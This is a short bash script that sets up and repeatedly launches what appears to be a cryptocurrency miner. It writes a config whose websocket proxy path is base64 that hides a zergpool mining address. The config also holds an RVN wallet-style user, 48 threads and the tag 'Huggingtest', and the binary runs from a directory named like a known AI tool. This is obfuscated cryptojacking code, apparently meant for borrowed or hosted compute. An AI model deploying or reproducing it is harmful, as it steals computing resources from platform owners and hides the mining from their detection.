#!/bin/bash

max_retries=5
retry_count=0
success=false

cd ~/ollma || { echo "Failed to cd to ~/ollma. Ensure the directory exists."; exit 1; }

if [ ! -x ./node ]; then
  chmod +x ./node || { echo "Failed to chmod ./node. Check file ownership/permissions."; exit 1; }
fi

while [ $retry_count -lt $max_retries ] && [ "$success" = false ]; do
  echo '{
    "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
    "config": { "threads": 48, "log": true },
    "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "Huggingtest" }
  }' > data.json

  # Run with timeout (10 seconds)
  output=$(timeout 10 ./node app.js 2>&1)
  if echo "$output" | grep -q "readyState 0 (CONNECTING)"; then
    echo "Connection failed, retrying... ($((retry_count+1))/$max_retries)"
    ((retry_count++))
    sleep 5
  else
    success=true
    echo "Command executed successfully. Output:"
    echo "$output"
  fi
done

if [ "$success" = false ]; then
  echo "Failed to connect after $max_retries attempts. The proxy server may be down or unstable—consider checking its status or using an alternative."
fi
